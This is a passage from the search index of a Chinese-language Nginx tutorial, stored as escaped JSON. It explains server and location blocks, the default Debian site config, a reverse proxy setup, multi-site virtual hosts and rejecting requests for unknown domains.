\u200b\u670d\u52a1\u200b\u7684\u200b\u529f\u80fd\u200b\uff08\u200b\u5305\u62ec\u200b <code>http</code> \u200b\u5757\u200b\uff09\u3002Nginx \u200b\u4e5f\u200b\u4e0d\u4ec5\u200b\u9650\u4e8e\u200b HTTP \u200b\u670d\u52a1\u200b\u2014\u2014\u200b\u53ef\u4ee5\u200b\u8f6c\u53d1\u200b TCP \u200b\u548c\u200b UDP \u200b\u6d41\u91cf\u200b\uff0c\u200b\u751a\u81f3\u200b\u662f\u200b\u5f53\u200b\u90ae\u4ef6\u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u6216\u8005\u200b RTMP \u200b\u76f4\u64ad\u200b\u670d\u52a1\u5668\u200b\u7b49\u200b\u3002\u200b\u8fd9\u4e9b\u200b\u529f\u80fd\u200b\u90fd\u200b\u662f\u200b\u901a\u8fc7\u200b\u4e0d\u540c\u200b\u7684\u200b\u6a21\u5757\u200b\u6765\u200b\u5b9e\u73b0\u200b\u7684\u200b\u3002\u200b\u7528\u6237\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u81ea\u5df1\u200b\u7f16\u8bd1\u200b\u5b89\u88c5\u200b\u7b2c\u4e09\u65b9\u200b\u6a21\u5757\u200b\u6765\u200b\u6269\u5c55\u200b Nginx \u200b\u7684\u200b\u529f\u80fd\u200b\u3002\u200b\u5982\u679c\u200b\u4f7f\u7528\u200b\u4e86\u200b Debian \u200b\u63d0\u4f9b\u200b\u7684\u200b Nginx \u200b\u5305\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b Debian \u200b\u7f16\u5199\u200b\u7684\u200b\u4e00\u4e9b\u200b\u7b2c\u4e09\u65b9\u200b\u6a21\u5757\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u6a21\u5757\u200b\u4ee5\u200b <code>libnginx-mod-</code> \u200b\u524d\u7f00\u200b\u5f00\u5934\u200b\uff1b\u200b\u5982\u679c\u200b\u8981\u200b\u81ea\u884c\u200b\u7f16\u8bd1\u200b\u6a21\u5757\u200b\uff0c\u200b\u9700\u8981\u200b\u5b89\u88c5\u200b <code>nginx-dev</code> \u200b\u5305\u200b\u3002</p> <p>Nginx \u200b\u6587\u6863\u200b \u200b\u662f\u200b\u975e\u5e38\u200b\u91cd\u8981\u200b\u7684\u200b\u53c2\u8003\u8d44\u6599\u200b\uff0c\u200b\u5176\u200b\u5305\u542b\u200b\u4e86\u200b\uff1a</p> <ul> <li>\u200b\u6309\u200b\u5b57\u6bcd\u200b\u5e8f\u200b\u6392\u5e8f\u200b\u7684\u200b directive \u200b\u5217\u8868\u200b\u6587\u6863\u200b</li> <li>\u200b\u6309\u200b\u5b57\u6bcd\u200b\u5e8f\u200b\u6392\u5e8f\u200b\u7684\u200b\u53d8\u91cf\u200b\u5217\u8868\u200b\u6587\u6863\u200b</li> <li>\u200b\u5b98\u65b9\u200b\u6a21\u5757\u200b\u7684\u200b\u5217\u8868\u200b\u6587\u6863\u200b</li> </ul> <p>\u200b\u5176\u4e2d\u200b\u6bcf\u4e2a\u200b directive \u200b\u548c\u200b\u53d8\u91cf\u200b\u90fd\u200b\u5305\u542b\u200b\u4e86\u200b\u8be6\u7ec6\u200b\u7684\u200b\u8bf4\u660e\u200b\u3002</p>"},{"location":"ops/network-service/nginx/#server-location-blocks","title":"<code>server</code> \u200b\u5757\u200b\u4e0e\u200b <code>location</code> \u200b\u5757","text":"<p>Nginx \u200b\u914d\u7f6e\u200b\u7684\u200b <code>http</code> \u200b\u5757\u200b\u4e2d\u200b\u53ef\u4ee5\u200b\u6709\u200b\u591a\u4e2a\u200b <code>server</code> \u200b\u5757\u200b\uff0c\u200b\u6bcf\u4e2a\u200b <code>server</code> \u200b\u5757\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u7ad9\u70b9\u200b\uff08\u200b\u865a\u62df\u4e3b\u673a\u200b\uff09\uff0cNginx \u200b\u4f1a\u200b\u6839\u636e\u200b\u8bf7\u6c42\u200b\u7684\u200b\u57df\u540d\u200b\u548c\u200b\u7aef\u53e3\u53f7\u200b\u6765\u200b\u5339\u914d\u200b\u5bf9\u5e94\u200b\u7684\u200b <code>server</code> \u200b\u5757\u200b\u3002Nginx \u200b\u6b63\u662f\u200b\u901a\u8fc7\u200b <code>server</code> \u200b\u5757\u200b\u6765\u200b\u5b9e\u73b0\u200b\u591a\u200b\u7ad9\u70b9\u200b\u914d\u7f6e\u200b\u7684\u200b\u3002</p> <p>\u200b\u4e00\u4e2a\u200b\u5178\u578b\u200b\u7684\u200b <code>server</code> \u200b\u5757\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>server {\n    listen 80;  # \u200b\u76d1\u542c\u200b\u7684\u200b\u7aef\u53e3\u200b\n    server_name example.com;  # \u200b\u670d\u52a1\u5668\u200b\u540d\u79f0\u200b\n\n    location / {\n        # \u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b\u7684\u200b\u6307\u4ee4\u200b\n    }\n}\n</code></pre> <p><code>location</code> \u200b\u5757\u200b\u5d4c\u5957\u200b\u4e8e\u200b <code>server</code> \u200b\u5757\u200b\u4e2d\u200b\uff0c\u200b\u7528\u4e8e\u200b\u5b9a\u4e49\u200b\u5982\u4f55\u200b\u5904\u7406\u200b\u7279\u5b9a\u200b URI \u200b\u7684\u200b\u8bf7\u6c42\u200b\u3002\u200b\u4e00\u4e2a\u200b <code>server</code> \u200b\u5757\u200b\u4e2d\u200b\u53ef\u4ee5\u200b\u6709\u200b\u591a\u4e2a\u200b <code>location</code> \u200b\u5757\u200b\u3002</p> URI? URL? <p>URI\uff08Uniform Resource Identifier\uff0c\u200b\u7edf\u4e00\u200b\u8d44\u6e90\u200b\u6807\u8bc6\u7b26\u200b\uff09\u200b\u5305\u542b\u200b URL\uff08Uniform Resource Locator\uff0c\u200b\u7edf\u4e00\u200b\u8d44\u6e90\u200b\u5b9a\u4f4d\u200b\u7b26\u200b\uff09\u200b\u548c\u200b URN\uff08Uniform Resource Name\uff0c\u200b\u7edf\u4e00\u200b\u8d44\u6e90\u200b\u540d\u79f0\u200b\uff09\u3002\u200b\u5176\u4e2d\u200b URL \u200b\u5927\u5bb6\u200b\u90fd\u200b\u975e\u5e38\u200b\u719f\u6089\u200b\uff0c\u200b\u800c\u200b URN \u200b\u5219\u200b\u6bd4\u8f83\u200b\u5c11\u89c1\u200b\u3002URN \u200b\u7684\u200b\u683c\u5f0f\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b <code>urn:isbn:0262510871</code>\uff0c\u200b\u7528\u4e8e\u200b\u6807\u8bc6\u200b\u8d44\u6e90\u200b\uff08\u200b\u8fd9\u91cc\u200b\u662f\u200b\u4e00\u200b\u672c\u4e66\u200b\uff09\u200b\u7684\u200b\u540d\u79f0\u200b\u3002\u200b\u56e0\u4e3a\u200b URN \u200b\u5f88\u5c11\u200b\u89c1\u200b\uff0c\u200b\u5728\u200b\u7edd\u5927\u90e8\u5206\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0cURI \u200b\u548c\u200b URL \u200b\u53ef\u4ee5\u200b\u89c6\u4e3a\u200b\u540c\u4e49\u8bcd\u200b\u3002</p> <p>Nginx \u200b\u7684\u200b <code>location</code> \u200b\u5757\u200b\u7528\u4e8e\u200b\u5b9a\u4e49\u200b\u5982\u4f55\u200b\u5904\u7406\u200b\u7279\u5b9a\u200b URI \u200b\u7684\u200b\u8bf7\u6c42\u200b\u3002\u200b\u5b83\u200b\u662f\u200b Nginx \u200b\u914d\u7f6e\u200b\u4e2d\u200b\u7684\u200b\u4e00\u4e2a\u200b\u91cd\u8981\u200b\u90e8\u5206\u200b\uff0c\u200b\u5141\u8bb8\u200b\u8ba9\u200b Nginx \u200b\u6839\u636e\u200b\u8bf7\u6c42\u200b\u7684\u200b\u8def\u5f84\u200b\u3001\u200b\u53c2\u6570\u200b\u6216\u200b\u5176\u4ed6\u200b\u6761\u4ef6\u200b\u6765\u200b\u6267\u884c\u200b\u4e0d\u540c\u200b\u7684\u200b\u64cd\u4f5c\u200b\u3002</p> <p>\u200b\u4e00\u4e2a\u200b <code>location</code> \u200b\u5757\u200b\u7684\u200b\u57fa\u672c\u200b\u7ed3\u6784\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>location [modifier] /path/ {\n    # \u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b\u7684\u200b\u6307\u4ee4\u200b\n}\n</code></pre> <p>\u200b\u5176\u4e2d\u200b\u53ef\u9009\u200b\u7684\u200b <code>modifier</code> \u200b\u7528\u4e8e\u200b\u6307\u5b9a\u200b\u5339\u914d\u200b\u65b9\u5f0f\u200b\uff08\u200b\u4f8b\u5982\u200b\u7cbe\u786e\u200b\u5339\u914d\u200b\u3001\u200b\u6b63\u5219\u200b\u5339\u914d\u200b\u7b49\u200b\uff09\uff0c\u200b\u9ed8\u8ba4\u200b\u4e0d\u200b\u586b\u5199\u200b\u7684\u8bdd\u200b\u5219\u200b\u4e3a\u200b\u524d\u7f00\u200b\u5339\u914d\u200b\uff0c\u200b\u8be6\u7ec6\u200b\u4ecb\u7ecd\u200b\u89c1\u200b\u4e0b\u9762\u200b\u7684\u200b Location \u200b\u5339\u914d\u200b\u90e8\u5206\u200b\u3002</p>"},{"location":"ops/network-service/nginx/#site-config-intro","title":"\u7ad9\u70b9\u200b\u914d\u7f6e\u200b\u7b80\u4ecb","text":"<p>\u200b\u9ed8\u8ba4\u200b\u7684\u200b\u7ad9\u70b9\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u5728\u200b <code>/etc/nginx/sites-available/default</code>\uff0c\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u7f16\u8f91\u200b\u5b83\u200b\u2014\u2014\u200b\u4ee5\u4e0b\u200b\u4e3a\u200b\u53bb\u200b\u9664\u4e86\u200b\u6240\u6709\u200b\u6ce8\u91ca\u200b\u7684\u200b\u9ed8\u8ba4\u200b\u7248\u672c\u200b\uff1a</p> <pre><code>server {\n    listen 80 default_server;\n    listen [::]:80 default_server;\n\n    root /var/www/html;\n    index index.html index.htm index.nginx-debian.html;\n\n    server_name _;\n\n    location / {\n        try_files $uri $uri/ =404;\n    }\n}\n</code></pre> <p>\u200b\u8fd9\u4e2a\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5b8c\u6574\u200b\u7684\u200b <code>server</code> \u200b\u5757\u200b\u3002<code>server</code> \u200b\u5757\u200b\u4e2d\u200b\u7684\u200b\u6307\u4ee4\u200b\u5982\u4e0b\u200b\uff1a</p> <ul> <li><code>listen</code>\uff1a\u200b\u8be5\u200b\u9ed8\u8ba4\u200b\u7ad9\u70b9\u200b\u5728\u200b\u6240\u6709\u200b\u7684\u200b IPv4 \u200b\u548c\u200b IPv6 \u200b\u4e0a\u200b\u76d1\u542c\u200b 80 \u200b\u7aef\u53e3\u200b\u3002</li> <li><code>root</code>\uff1a\u200b\u6839\u76ee\u5f55\u200b\u662f\u200b <code>/var/www/html</code>\u3002</li> <li><code>index</code>\uff1a\u200b\u5728\u200b\u5904\u7406\u200b URL \u200b\u7ed3\u5c3e\u200b\u4e3a\u200b <code>/</code> \u200b\u7684\u200b\u8bf7\u6c42\u200b\u65f6\u200b\uff0c\u200b\u4f7f\u7528\u200b\u7684\u200b\u9ed8\u8ba4\u200b\u7684\u200b\u9996\u9875\u200b\u6587\u4ef6\u200b\u662f\u200b <code>index.html</code>\u3001<code>index.htm</code> \u200b\u548c\u200b <code>index.nginx-debian.html</code>\uff1bNginx \u200b\u4f1a\u200b\u6309\u200b\u987a\u5e8f\u200b\u67e5\u627e\u200b\u8fd9\u4e9b\u200b\u6587\u4ef6\u200b\uff0c\u200b\u627e\u5230\u200b\u7b2c\u4e00\u4e2a\u200b\u5b58\u5728\u200b\u7684\u200b\u6587\u4ef6\u200b\u540e\u200b\u8fd4\u56de\u200b\u7ed9\u200b\u5ba2\u6237\u7aef\u200b\u3002</li> <li><code>server_name</code>\uff1a\u200b\u4e00\u4e2a\u200b\u7ea6\u5b9a\u4fd7\u6210\u200b\u7684\u200b\u201c\u200b\u9ed8\u8ba4\u200b\u670d\u52a1\u5668\u200b\u201d\u200b\u540d\u79f0\u200b <code>_</code>\u3002</li> <li><code>location /</code>\uff1a\u200b\u5904\u7406\u200b\u6240\u6709\u200b\u4ee5\u200b <code>/</code> \u200b\u5f00\u5934\u200b\u7684\u200b\u8bf7\u6c42\u200b\u3002<ul> <li><code>try_files $uri $uri/ =404;</code>\uff1a\u200b\u5c1d\u8bd5\u200b\u6309\u200b\u987a\u5e8f\u200b\u67e5\u627e\u200b\u8bf7\u6c42\u200b\u7684\u200b\u6587\u4ef6\u200b <code>$uri</code>\uff08\u200b\u8bf7\u6c42\u200b\u7684\u200b\u8def\u5f84\u200b\uff09\uff0c\u200b\u5982\u679c\u200b\u627e\u200b\u4e0d\u5230\u200b\u5219\u200b\u5c1d\u8bd5\u200b\u67e5\u627e\u200b\u76ee\u5f55\u200b <code>$uri/</code>\uff0c\u200b\u5982\u679c\u200b\u4ecd\u7136\u200b\u627e\u200b\u4e0d\u5230\u200b\u5219\u200b\u8fd4\u56de\u200b 404 \u200b\u9519\u8bef\u200b\u3002</li> </ul> </li> </ul> <p>\u200b\u8fd9\u65f6\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u5728\u200b <code>/var/www/html</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u653e\u7f6e\u200b\u4f60\u200b\u81ea\u5df1\u200b\u7684\u200b HTML\u3001CSS\u3001JS \u200b\u7b49\u200b\u6587\u4ef6\u200b\uff0c\u200b\u7136\u540e\u200b\u8bbf\u95ee\u200b <code>http://localhost</code> \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u4f60\u200b\u7684\u200b\u7f51\u7ad9\u200b\u4e86\u200b\u3002</p> <p>\u200b\u53cd\u5411\u200b\u4ee3\u7406\u200b\u662f\u200b\u4ee3\u8868\u200b\u670d\u52a1\u5668\u200b\u63a5\u6536\u200b\u5ba2\u6237\u7aef\u200b\u8bf7\u6c42\u200b\u3001\u200b\u8f6c\u53d1\u200b\u5230\u200b\u540e\u200b\u7aef\u200b\u3001\u200b\u518d\u200b\u8fd4\u56de\u200b\u7ed3\u679c\u200b\u7684\u200b\u4e00\u5c42\u200b\u4e2d\u95f4\u200b\u4ee3\u7406\u200b\u3002\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u8fd9\u91cc\u200b\u7684\u200b\u300c\u200b\u540e\u200b\u7aef\u200b\u300d\u200b\u662f\u200b\u53cd\u5411\u200b\u4ee3\u7406\u200b\u7684\u200b\u300c\u200b\u4e0a\u6e38\u200b\u300d\u3002\u200b\u4e00\u79cd\u200b\u5e38\u89c1\u200b\u7684\u200b\u9700\u6c42\u200b\u662f\u200b\u8ba9\u200b Nginx \u200b\u4f5c\u4e3a\u200b\u5176\u4ed6\u200b\u540e\u200b\u7aef\u200b\u670d\u52a1\u200b\u7684\u200b\u53cd\u5411\u200b\u4ee3\u7406\u200b\u3002\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b\u4e0b\u9762\u200b\u7684\u200b\u914d\u7f6e\u200b\uff1a</p> <pre><code>server {\n    listen 80 default_server; # \u200b\u76d1\u542c\u200b 80 \u200b\u7aef\u53e3\u200b\n    listen [::]:80 default_server;\n\n    location / {\n        proxy_pass http://backend_server:port;  # \u200b\u66ff\u6362\u200b\u4e3a\u200b\u540e\u200b\u7aef\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u5730\u5740\u200b\u548c\u200b\u7aef\u53e3\u200b\n        proxy_set_header Host $host;  # \u200b\u8bbe\u7f6e\u200b\u4e3b\u673a\u200b\u5934\u200b\n        proxy_set_header X-Real-IP $remote_addr;  # \u200b\u8bbe\u7f6e\u200b\u771f\u5b9e\u200b\u5ba2\u6237\u7aef\u200b IP\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;  # \u200b\u8bbe\u7f6e\u200b\u8f6c\u53d1\u200b\u7684\u200b IP\n        proxy_set_header X-Forwarded-Proto $scheme;  # \u200b\u8bbe\u7f6e\u200b\u8f6c\u53d1\u200b\u7684\u200b\u534f\u8bae\u200b\n    }\n}\n</code></pre> <p>\u200b\u5176\u4e2d\u200b\u5bf9\u200b\u7edd\u5927\u90e8\u5206\u200b\u540e\u200b\u7aef\u200b\u670d\u52a1\u200b\u6765\u8bf4\u200b\uff0c<code>Host</code> \u200b\u5934\u200b\u662f\u200b\u5fc5\u987b\u200b\u8bbe\u7f6e\u200b\u7684\u200b\u3002</p> <p>\u200b\u7ea6\u5b9a\u4fd7\u6210\u200b\u7684\u200b HTTP \u200b\u8bf7\u6c42\u200b\u5934\u200b</p> <p>\u200b\u4ee5\u4e0a\u200b\u914d\u7f6e\u200b\u4e2d\u200b\u9664\u4e86\u200b <code>Host</code> \u200b\u662f\u200b HTTP/1.1 \u200b\u6807\u51c6\u200b\u7684\u200b\u8bf7\u6c42\u200b\u5934\u200b\u4ee5\u5916\u200b\uff0c\u200b\u5176\u4ed6\u200b\u4ee5\u200b <code>X-</code> \u200b\u5f00\u5934\u200b\u7684\u200b\u8bf7\u6c42\u200b\u5934\u200b\u90fd\u200b\u662f\u200b\u7ea6\u5b9a\u4fd7\u6210\u200b\u7684\u200b\u975e\u6807\u51c6\u200b\u8bf7\u6c42\u200b\u5934\u200b\uff0c\u200b\u7528\u4e8e\u200b\u8ba9\u200b\u53cd\u5411\u200b\u4ee3\u7406\u200b\uff08Nginx\uff09\u200b\u4f20\u9012\u200b\u8bf7\u6c42\u200b\u7528\u6237\u200b\u7684\u200b\u771f\u5b9e\u200b IP \u200b\u5730\u5740\u200b\u548c\u200b\u8bf7\u6c42\u200b\u534f\u8bae\u200b\u7b49\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5426\u5219\u200b\u540e\u200b\u7aef\u200b\u670d\u52a1\u200b\u53ea\u80fd\u200b\u770b\u5230\u200b\u53cd\u4ee3\u200b\u672c\u8eab\u200b\u7684\u200b IP \u200b\u4fe1\u606f\u200b\u3002\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u5982\u679c\u200b\u540e\u200b\u7aef\u200b\u670d\u52a1\u5668\u200b\u6ca1\u6709\u200b\u7ecf\u8fc7\u200b\u53cd\u5411\u200b\u4ee3\u7406\u200b\uff0c\u200b\u6216\u8005\u200b\u53cd\u5411\u200b\u4ee3\u7406\u200b\u914d\u7f6e\u200b\u4e0d\u200b\u6b63\u786e\u200b\uff0c\u200b\u90a3\u4e48\u200b\u7528\u6237\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u4f2a\u9020\u200b\u8fd9\u4e9b\u200b\u8bf7\u6c42\u200b\u5934\u200b\uff0c\u200b\u5982\u679c\u200b\u6b64\u65f6\u200b\u540e\u200b\u7aef\u200b\u670d\u52a1\u200b\u9519\u8bef\u200b\u5730\u200b\u4fe1\u4efb\u200b\u4e86\u200b\u8fd9\u4e9b\u200b\u8bf7\u6c42\u200b\u5934\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\u3002</p> <p>\u200b\u8fd9\u65f6\u200b\u8bbf\u95ee\u200b <code>http://localhost</code> \u200b\u5c31\u200b\u4f1a\u200b\u88ab\u200b\u8f6c\u53d1\u200b\u5230\u200b <code>http://backend_server:port</code>\u3002\u200b\u5bf9\u5916\u90e8\u200b\u7f51\u7edc\u200b\u6765\u8bf4\u200b\uff0cNginx \u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u53cd\u5411\u200b\u4ee3\u7406\u200b\u7ad9\u70b9\u200b\u3002</p>"},{"location":"ops/network-service/nginx/#multiple-servers","title":"\u591a\u200b\u7ad9\u70b9\u200b\u914d\u7f6e","text":"<p>Nginx \u200b\u7684\u200b\u4e00\u4e2a\u200b\u5341\u5206\u200b\u70ab\u9177\u200b\u7684\u200b\u529f\u80fd\u200b\u5c31\u662f\u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b\u4e00\u53f0\u200b\u4e3b\u673a\u200b\u4e0a\u200b\u8fd0\u884c\u200b\u591a\u4e2a\u200b\u7f51\u7ad9\u200b\uff0c\u200b\u5bf9\u200b\u4e0d\u540c\u200b\u7684\u200b\u57df\u540d\u200b\u63d0\u4f9b\u200b\u4e0d\u540c\u200b\u7684\u200b\u670d\u52a1\u200b\u3002\u200b\u8fd9\u200b\u5c31\u662f\u200b\u6240\u8c13\u200b\u7684\u200b\u865a\u62df\u4e3b\u673a\u200b\u914d\u7f6e\u200b\u3002</p> <p>\u200b\u90a3\u4e48\u200b\u5982\u4f55\u200b\u5b9e\u73b0\u200b\u5462\u200b\uff1f\u200b\u7b54\u6848\u200b\u5c31\u662f\u200b <code>server</code> \u200b\u5757\u200b\u4e2d\u200b\u7684\u200b <code>server_name</code> \u200b\u6307\u4ee4\u200b\u3002<code>server_name</code> \u200b\u6307\u4ee4\u200b\u7528\u4e8e\u200b\u5b9a\u4e49\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u540d\u79f0\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u662f\u200b\u57df\u540d\u200b\u3001IP \u200b\u5730\u5740\u200b\u3001\u200b\u901a\u914d\u7b26\u200b\u7b49\u200b\u3002\u200b\u6211\u4eec\u200b\u6765\u770b\u200b\u4e00\u4e2a\u200b\u5178\u578b\u200b\u7684\u200b\u793a\u4f8b\u200b\uff1a</p> <ul> <li>\u200b\u5bf9\u4e8e\u200b\u8bf7\u6c42\u200b <code>example.com</code> \u200b\u548c\u200b <code>www.example.com</code>\uff0cNginx \u200b\u4f1a\u200b\u4f7f\u7528\u200b\u7b2c\u4e00\u4e2a\u200b server \u200b\u5757\u200b\u6765\u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u7684\u200b\u7f51\u7ad9\u200b\u6839\u76ee\u5f55\u200b\u662f\u200b <code>/var/www/example.com</code>\u3002</li> <li>\u200b\u5bf9\u4e8e\u200b\u8bf7\u6c42\u200b <code>example.org</code> \u200b\u548c\u200b <code>www.example.org</code>\uff0cNginx \u200b\u4f1a\u200b\u4f7f\u7528\u200b\u7b2c\u4e8c\u4e2a\u200b server \u200b\u5757\u200b\u6765\u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b\u3002\u200b\u5bf9\u5e94\u200b\u7684\u200b\u7f51\u7ad9\u200b\u6839\u76ee\u5f55\u200b\u662f\u200b <code>/var/www/example.org</code>\u3002</li> <li>\u200b\u5bf9\u4e8e\u200b\u5176\u4ed6\u200b\u8bf7\u6c42\u200b\uff0cNginx \u200b\u4f1a\u200b\u8fd4\u56de\u200b 404 \u200b\u9519\u8bef\u200b\u3002</li> </ul> <pre><code>server {\n    listen 80;  # \u200b\u76d1\u542c\u200b\u7684\u200b\u7aef\u53e3\u200b\n    server_name example.com www.example.com;  # \u200b\u6307\u5b9a\u200b\u7684\u200b\u57df\u540d\u200b\n    root /var/www/example.com;  # \u200b\u7f51\u7ad9\u200b\u6839\u76ee\u5f55\u200b\n    location / {\n        try_files $uri $uri/ =404;\n    }\n}\n\nserver {\n    listen 80;  # \u200b\u76d1\u542c\u200b\u7684\u200b\u7aef\u53e3\u200b\n    server_name example.org www.example.org;  # \u200b\u6307\u5b9a\u200b\u7684\u200b\u57df\u540d\u200b\n    root /var/www/example.org;  # \u200b\u7f51\u7ad9\u200b\u6839\u76ee\u5f55\u200b\n    location / {\n        try_files $uri $uri/ =404;\n    }\n}\n\nserver {\n    listen 80 default_server;  # \u200b\u9ed8\u8ba4\u200b\u7ad9\u70b9\u200b\n    server_name _;  # \u200b\u9ed8\u8ba4\u200b\u57df\u540d\u200b\n    return 404;\n}\n</code></pre> <p>\u200b\u90a3\u200b <code>default_server</code> \u200b\u53c8\u200b\u662f\u200b\u4ec0\u4e48\u200b\u610f\u601d\u200b\u5462\u200b\uff1f\u200b\u5b83\u200b\u8868\u793a\u200b\u9ed8\u8ba4\u200b\u7ad9\u70b9\u200b\uff0c\u200b\u5f53\u200b\u8bf7\u6c42\u200b\u7684\u200b\u57df\u540d\u200b\u4e0d\u200b\u5728\u200b <code>server_name</code> \u200b\u4e2d\u200b\u65f6\u200b\uff0cNginx \u200b\u4f1a\u200b\u4f7f\u7528\u200b <code>default_server</code> \u200b\u5bf9\u5e94\u200b\u7684\u200b <code>server</code> \u200b\u5757\u200b\u6765\u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b\u3002\u200b\u8be5\u200b\u7ad9\u70b9\u200b\u7684\u200b server_name \u200b\u6307\u5b9a\u200b\u4e3a\u200b <code>_</code>\uff0c\u200b\u662f\u200b\u4e00\u79cd\u200b\u7ea6\u5b9a\u4fd7\u6210\u200b\u7684\u200b\u9ed8\u8ba4\u200b\u57df\u540d\u200b\uff0c\u200b\u672c\u8eab\u200b\u6ca1\u6709\u200b\u7279\u6b8a\u200b\u542b\u4e49\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u914d\u7f6e\u200b\u4e86\u200b <code>default_server</code> \u200b\u7684\u200b <code>server</code> \u200b\u5757\u200b\uff0c\u200b\u4f60\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5b8c\u5168\u200b\u4e0d\u5199\u200b <code>server_name</code> \u200b\u6307\u4ee4\u200b\u3002\u200b\u4e00\u822c\u200b\u5efa\u8bae\u200b\u4e3a\u200b Nginx \u200b\u914d\u7f6e\u200b\u4e00\u4e2a\u200b\u9ed8\u8ba4\u200b\u7ad9\u70b9\u200b\uff0c\u200b\u7528\u4e8e\u200b\u5904\u7406\u200b\u672a\u77e5\u200b\u57df\u540d\u200b\u7684\u200b\u8bf7\u6c42\u200b\u3002</p> <p>\u200b\u62d2\u7edd\u200b\u672a\u77e5\u200b\u57df\u540d\u200b\u8bf7\u6c42\u200b</p> <p>\u200b\u4f60\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u914d\u7f6e\u200b\u4e00\u4e2a\u200b\u9ed8\u8ba4\u200b\u7ad9\u70b9\u200b\u6765\u200b\u62d2\u7edd\u200b\u672a\u77e5\u200b\u57df\u540d\u200b\u7684\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>server {\n    listen 80 default_server;  # \u200b\u9ed8\u8ba4\u200b\u7ad9\u70b9\u200b\n    listen [::]:80 default_server;\n    listen 443 default_server ssl;  # \u200b\u9ed8\u8ba4\u200b\u7ad9\u70b9\u200b\uff08HTTPS\uff09\n    listen [::]:443 default_server ssl;\n    ssl_reject_handshake on;  # \u200b\u62d2\u7edd\u200b SSL \u200b\u63e1\u624b\u200b\n    return 444;  # \u200b\u76f4\u63a5\u200b\u5173\u95ed\u200b\u8fde\u63a5\u200b\n}\n</code></pre> <p>\u200b\u8fd9\u6837\u200b\uff0c\u200b\u5f53\u200b\u8bf7\u6c42\u200b\u7684\u200b\u57df\u540d\u200b\u4e0d\u200b\u7b26\u5408\u200b\u4efb\u4f55\u200b\u4e00\u4e2a\u200b\u5df2\u7ecf\u200b\u914d\u7f6e\u200b\u7684\u200b <code>server_name</code> \u200b\u65f6\u200b\uff0cNginx \u200b\u5bf9\u4e8e\u200b HTTP \u200b\u8bf7\u6c42\u200b\u4f1a\u200b\u76f4\u63a5\u200b\u5173\u95ed\u200b\u8fde\u63a5\u200b\uff0c\u200b\u540c\u65f6\u200b\u62d2\u7edd\u200b HTTPS \u200b\u8bf7\u6c42\u200b\u7684\u200b SSL \u200b\u63e1\u624b\u200b\u3002</p> <p>\u200b\u4e00\u4e9b\u200b\u7279\u5b9a\u200b\u5730\u533a\u200b\u6216\u200b\u73af\u5883\u200b\u7684\u200b\u76d1\u7ba1\u200b\u8981\u6c42\u200b HTTP \u200b\u670d\u52a1\u5668\u200b\u5bf9\u200b\u672a\u5907\u6848\u200b\u767b\u8bb0\u200b\u7684\u200b\u57df\u540d\u200b\u7684\u200b\u8bf7\u6c42\u200b\u62d2\u7edd\u200b\u54cd\u5e94\u200b\uff0c\u200b\u8fd9\u65f6\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u8fd9\u79cd\u200b\u914d\u7f6e\u200b\u3002</p> <p>\u200b\u6211\u4eec\u200b\u5efa\u8bae\u200b\u5c06\u200b\u4e0d\u540c\u200b\u7684\u200b\u7ad9\u70b9\u200b\u914d\u7f6e\u200b\u653e\u7f6e\u200b\u4e8e\u200b\u4e0d\u540c\u200b\u7684\u200b\u6587\u4ef6\u200b\u4e2d\u200b\uff1a</p> /etc/nginx/sites-available/example.com<pre><code>server {\n    listen 80;\n    server_name example.com www.example.com;\n    # ...\n}\n</code></pre> /etc/nginx/sites-available/example.org<pre><code>server {\n    listen 80;\n    server_name example.org www.example.org;\n    # ...\n}\n</code></pre> /etc/nginx/sites-available/default<pre><code>server {\n    listen 80 default_server;\n    server_name _;\n    # ...\n}\n</code></pre> <p>\u200b\u7136\u540e\u200b\u5728\u200b <code>/etc/nginx/sites-enabled</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u521b\u5efa\u200b\u7b26\u53f7\u200b\u94fe\u63a5\u200b\uff1a</p> <pre><code>sudo ln -sf /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/\nsudo ln -sf /etc/nginx/sites-available/example.org /etc/nginx/sites-enabled/\n# 